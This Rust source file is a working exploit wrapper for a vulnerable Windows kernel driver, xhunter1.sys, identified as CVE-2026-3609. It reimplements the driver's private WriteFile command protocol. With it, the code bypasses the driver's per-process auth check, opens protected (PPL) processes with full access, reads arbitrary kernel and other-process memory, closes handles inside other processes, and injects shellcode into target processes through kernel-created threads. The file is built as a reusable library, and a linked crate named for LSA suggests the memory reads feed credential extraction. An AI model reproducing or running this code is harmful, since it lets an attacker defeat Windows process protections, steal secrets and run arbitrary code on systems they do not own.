//! xhunter1.sys driver wrapper — CVE-2026-3609.
//!
//! The driver does not use `DeviceIoControl`. Commands are sent through
//! `WriteFile` (`IRP_MJ_WRITE`) using a fixed 624-byte request buffer.
//! The dispatch entry validates length + a magic value packed into the
//! first eight bytes, then routes on an opcode at `+0x0C`.
//!
//! Key opcodes:
//!
//!   * **785** — PPL-bypassing process handle via `ObOpenObjectByPointer(KernelMode)`.
//!   * **787** — cross-process memory read via `KeStackAttachProcess` + memcpy.
//!   * **788** — arbitrary kernel-VA read via `MmIsAddressValid` + memcpy.
//!   * **800** — handle stomp: `ObSetHandleAttributes(KernelMode)` + `ZwClose`.
//!   * **820** — driver-side RWX alloc + copy + `RtlCreateUserThread`.

#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ffi::c_void;

use windows::Win32::{
    Foundation::{CloseHandle, GENERIC_WRITE, HANDLE},
    Storage::FileSystem::{
        CreateFileA, WriteFile, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, OPEN_EXISTING,
    },
    System::{
        Diagnostics::Debug::ReadProcessMemory,
        Threading::GetCurrentProcessId,
    },
};

pub type Result<T> = std::result::Result<T, String>;

// `MemReader` trait moved to shared crate `axhunter-lsa`.
pub use axhunter_lsa::MemReader;

// ─── Protocol constants ─────────────────────────────────────────────────────

/// Default device name. The driver's service name varies per host —
/// pass an override to `Xhunter::open_named` if `\\.\xhunter` doesn't exist.
pub const DEFAULT_DEVICE: &str = "\\\\.\\xhunter";

const XHUNTER_MAGIC:    u32   = 0x345821AB;
const XHUNTER_LENGTH:   u32   = 0x270;          // request size, must equal CMD_BUF_SIZE
const RESPONSE_LENGTH:  usize = 762;            // driver writes exactly 0x2FA bytes
const CMD_BUF_SIZE:     usize = 0x270;

const CMD_OPEN_PROCESS:   u32 = 785;            // 0x311 — PPL-bypassing handle
const CMD_READ_MEMORY:    u32 = 787;            // 0x313 — KeStackAttachProcess + memcpy
const CMD_CLOSE_HANDLE:   u32 = 800;            // 0x320 — KeStackAttachProcess + ObSetHandleAttributes + ZwClose
const CMD_KERNEL_READ:    u32 = 788;            // 0x314 — MmIsAddressValid + memcpy from kernel VA to user VA
const CMD_INIT_PTRS:      u32 = 801;            // 0x321 — sub_140009C5C: captures RtlCreateUserThread etc.
const CMD_INJECT_THREAD:  u32 = 815;            // 0x32F — kernel-mediated shellcode injection (ungated, latest driver)
const CMD_INJECT_RWX:     u32 = 820;            // 0x334 — RWX alloc + copy + RtlCreateUserThread, sentinel protocol
// Allowlist-write opcodes used to bypass the new driver's per-PID auth gate
// (`sub_140005E84` requires `(flags & 0x80000008) == 0x80000008`):
const CMD_REGISTER_SELF:  u32 = 777;            // sub_140003498 → sets bit 31 (0x80000000) for caller PID
const CMD_SET_PID_FLAGS:  u32 = 775;            // sub_140001DD8 → writes lower 16 flag bits for any PID

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;

// Request buffer field offsets (see writeup).
const REQ_OFF_LENGTH:   usize = 0x00;
const REQ_OFF_MAGIC:    usize = 0x04;
const REQ_OFF_XOR_KEY:  usize = 0x08;
const REQ_OFF_OPCODE:   usize = 0x0C;
const REQ_OFF_RESP_PTR: usize = 0x10;
const REQ_OFF_ARG0:     usize = 0x18;
const REQ_OFF_ARG1:     usize = 0x1C;
const REQ_OFF_ARG2:     usize = 0x20;
const REQ_OFF_ARG3:     usize = 0x28;
const REQ_OFF_ARG4:     usize = 0x30;

// Cmd 815 (inject_thread): driver reads these via sub_14000A028 →
// sub_14000A7A4 from the buffer at `req+0x18`. Inside that function
// `a1+N` (decimal byte offset N from a1=req+0x18) means request offset
// `0x18 + N`:
//   PID         : a1+8   → req+0x20
//   shellcode   : a1+48  → req+0x48
//   length      : a1+56  → req+0x50
//   entry offs. : a1+64  → req+0x58
//   mode byte   : a1+72  → req+0x60
const REQ_OFF_INJECT_PID:    usize = 0x20;       // u32: target PID (mode bit 0x02 = PID lookup)
const REQ_OFF_INJECT_SRC:    usize = 0x48;       // u64: caller-space shellcode pointer
const REQ_OFF_INJECT_LEN:    usize = 0x50;       // u32: shellcode size
const REQ_OFF_INJECT_OFFSET: usize = 0x58;       // u32: entry offset within target allocation
const REQ_OFF_INJECT_MODE:   usize = 0x60;       // u8:  0x02 → look up target by PID

// Cmd 820 (inject_rwx): sub_14000A1AC. Same target-resolution as cmd 815 but with
// a sentinel protocol — driver writes 0xE01AF119 at payload[sentinel_offset] before
// the thread runs; payload must zero that DWORD to signal completion.
const REQ_OFF_RWX_PID:      usize = 0x20;        // u32: target PID (flags bit 1)
const REQ_OFF_RWX_SRC:      usize = 0x30;        // u64: caller-space payload pointer
const REQ_OFF_RWX_LEN:      usize = 0x38;        // u32: payload size (must cover sentinel+4)
const REQ_OFF_RWX_ENTRY:    usize = 0x3C;        // u32: entry offset in target allocation
const REQ_OFF_RWX_SENTINEL: usize = 0x40;        // u32: sentinel offset (driver writes 0xE01AF119 here)
const REQ_OFF_RWX_FLAGS:    usize = 0x44;        // u8:  0x02 → resolve via PID

// Response buffer field offsets.
const RESP_OFF_STATUS:  usize = 0x0C;
const RESP_OFF_HANDLE:  usize = 0x10;

// ─── Raw driver handle ─────────────────────────────────────────────────────

pub struct Xhunter {
    device: HANDLE,
}

impl Xhunter {
    pub fn open() -> Result<Self> { Self::open_named(DEFAULT_DEVICE) }

    pub fn open_named(path: &str) -> Result<Self> {
        let cstr = std::ffi::CString::new(path)
            .map_err(|_| "device path contains NUL".to_string())?;
        let h = unsafe {
            CreateFileA(
                windows::core::PCSTR(cstr.as_ptr() as _),
                GENERIC_WRITE.0,
                FILE_SHARE_MODE(0),
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
        }
        .map_err(|e| format!("CreateFileA({path}): {e}"))?;
        Ok(Self { device: h })
    }

    /// Send one command, return `(NTSTATUS, response_buffer)`.
    fn send_cmd(&self, opcode: u32, fill: impl FnOnce(&mut [u8])) -> Result<(i32, Vec<u8>)> {
        let mut req  = [0u8; CMD_BUF_SIZE];
        let mut resp = vec![0u8; RESPONSE_LENGTH];

        unsafe {
            let p = req.as_mut_ptr();
            *(p.add(REQ_OFF_LENGTH)   as *mut u32) = XHUNTER_LENGTH;
            *(p.add(REQ_OFF_MAGIC)    as *mut u32) = XHUNTER_MAGIC;
            *(p.add(REQ_OFF_XOR_KEY)  as *mut u32) = 0x41414141;
            *(p.add(REQ_OFF_OPCODE)   as *mut u32) = opcode;
            *(p.add(REQ_OFF_RESP_PTR) as *mut u64) = resp.as_mut_ptr() as u64;
        }

        fill(&mut req);

        let mut written = 0u32;
        unsafe {
            WriteFile(self.device, Some(&req), Some(&mut written), None)
                .map_err(|e| format!("WriteFile (opcode {opcode}): {e}"))?;
        }

        let status = unsafe { *(resp.as_ptr().add(RESP_OFF_STATUS) as *const i32) };
        Ok((status, resp))
    }

    pub fn unlock_self(&self) -> Result<()> {
        let pid = unsafe { GetCurrentProcessId() };

        let (s, _) = self.send_cmd(CMD_REGISTER_SELF, |_| {})?;
        if s < 0 && (s as u32) != 0xC0000001 {
            return Err(format!("cmd 777 (register_self) NTSTATUS 0x{:08X}", s as u32));
        }

        let (s, _) = self.send_cmd(CMD_SET_PID_FLAGS, |req| unsafe {
            *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u32) = pid;
            *(req.as_mut_ptr().add(REQ_OFF_ARG1) as *mut u32) = 0x0008;
        })?;
        if s < 0 {
            return Err(format!("cmd 775 (set_pid_flags) NTSTATUS 0x{:08X}", s as u32));
        }
        Ok(())
    }

    pub fn open_process(&self, pid: u32) -> Result<HANDLE> {
        let (status, resp) = self.send_cmd(CMD_OPEN_PROCESS, |req| unsafe {
            *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u32) = pid;
            *(req.as_mut_ptr().add(REQ_OFF_ARG1) as *mut u32) = PROCESS_ALL_ACCESS;
        })?;
        if status < 0 {
            return Err(format!("cmd 785 (open_process) NTSTATUS 0x{:08X}", status as u32));
        }
        let raw = unsafe { *(resp.as_ptr().add(RESP_OFF_HANDLE) as *const u64) };
        if raw == 0 { return Err("driver returned NULL handle".into()); }
        Ok(HANDLE(raw as *mut c_void))
    }

    pub fn init_injection_ptrs(&self) -> Result<()> {
        let (_, _) = self.send_cmd(CMD_INIT_PTRS, |_| {})?;
        Ok(())
    }

    pub fn inject_thread(&self, pid: u32, shellcode: &[u8]) -> Result<i32> {
        let (status, _) = self.send_cmd(CMD_INJECT_THREAD, |req| unsafe {
            let p = req.as_mut_ptr();
            *(p.add(REQ_OFF_INJECT_PID)    as *mut u32) = pid;
            *(p.add(REQ_OFF_INJECT_SRC)    as *mut u64) = shellcode.as_ptr() as u64;
            *(p.add(REQ_OFF_INJECT_LEN)    as *mut u32) = shellcode.len() as u32;
            *(p.add(REQ_OFF_INJECT_OFFSET) as *mut u32) = 0;
            *(p.add(REQ_OFF_INJECT_MODE)   as *mut u8)  = 0x02;
        })?;
        Ok(status)
    }

    pub fn inject_rwx(&self, pid: u32, payload: &[u8], sentinel_offset: u32) -> Result<i32> {
        let (status, _) = self.send_cmd(CMD_INJECT_RWX, |req| unsafe {
            let p = req.as_mut_ptr();
            *(p.add(REQ_OFF_RWX_PID)      as *mut u32) = pid;
            *(p.add(REQ_OFF_RWX_SRC)      as *mut u64) = payload.as_ptr() as u64;
            *(p.add(REQ_OFF_RWX_LEN)      as *mut u32) = payload.len() as u32;
            *(p.add(REQ_OFF_RWX_ENTRY)    as *mut u32) = 0;
            *(p.add(REQ_OFF_RWX_SENTINEL) as *mut u32) = sentinel_offset;
            *(p.add(REQ_OFF_RWX_FLAGS)    as *mut u8)  = 0x02;
        })?;
        Ok(status)
    }

    pub fn close_remote_handle(&self, target_handle: HANDLE, victim: u64) -> Result<()> {
        let (status, _) = self.send_cmd(CMD_CLOSE_HANDLE, |req| unsafe {
            *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u64) = target_handle.0 as u64;
            *(req.as_mut_ptr().add(REQ_OFF_ARG2) as *mut u64) = victim;
        })?;
        if status < 0 {
            return Err(format!("cmd 800 (close_remote_handle) NTSTATUS 0x{:08X}", status as u32));
        }
        Ok(())
    }

    pub fn kernel_read(&self, src: u64, dst: &mut [u8]) -> bool {
        if dst.is_empty() { return true; }
        match self.send_cmd(CMD_KERNEL_READ, |req| unsafe {
            let p = req.as_mut_ptr();
            *(p.add(REQ_OFF_ARG0) as *mut u64) = src;
            *(p.add(REQ_OFF_ARG2) as *mut u64) = dst.as_mut_ptr() as u64;
            *(p.add(REQ_OFF_ARG3) as *mut u32) = dst.len() as u32;
        }) {
            Ok((status, _)) => status >= 0,
            Err(_) => false,
        }
    }

    fn driver_read(&self, target_handle: HANDLE, src: u64, buf: &mut [u8]) -> bool {
        if buf.is_empty() { return true; }
        match self.send_cmd(CMD_READ_MEMORY, |req| unsafe {
            *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u64) = target_handle.0 as u64;
            *(req.as_mut_ptr().add(REQ_OFF_ARG2) as *mut u64) = src;
            *(req.as_mut_ptr().add(REQ_OFF_ARG3) as *mut u64) = buf.as_mut_ptr() as u64;
            *(req.as_mut_ptr().add(REQ_OFF_ARG4) as *mut u32) = buf.len() as u32;
        }) {
            Ok((status, _)) => status >= 0,
            Err(_) => false,
        }
    }
}

impl Drop for Xhunter {
    fn drop(&mut self) {
        unsafe { let _ = CloseHandle(self.device); }
    }
}

// ─── Session: driver + an acquired target process handle ──────────────────

pub struct Session<'d> {
    driver:  &'d Xhunter,
    target:  HANDLE,
    use_rpm: bool,
}

impl<'d> Session<'d> {
    pub fn attach(driver: &'d Xhunter, pid: u32) -> Result<Self> {
        let target = driver.open_process(pid)?;
        let mut probe = [0u8; 8];
        let rpm_ok = unsafe {
            ReadProcessMemory(
                target,
                0x7FFE_0000 as *const c_void,
                probe.as_mut_ptr() as *mut c_void,
                8,
                None,
            ).is_ok()
        };
        Ok(Self { driver, target, use_rpm: rpm_ok })
    }

    pub fn handle(&self) -> HANDLE { self.target }
    pub fn uses_rpm(&self) -> bool { self.use_rpm }
}

impl MemReader for Session<'_> {
    fn read(&self, addr: u64, buf: &mut [u8]) -> bool {
        if buf.is_empty() { return true; }
        if addr == 0 { return false; }
        if self.use_rpm {
            unsafe {
                ReadProcessMemory(
                    self.target,
                    addr as *const c_void,
                    buf.as_mut_ptr() as *mut c_void,
                    buf.len(),
                    None,
                ).is_ok()
            }
        } else {
            self.driver.driver_read(self.target, addr, buf)
        }
    }
}

impl Drop for Session<'_> {
    fn drop(&mut self) {
        if !self.target.is_invalid() && !self.target.0.is_null() {
            unsafe { let _ = CloseHandle(self.target); }
        }
    }
}
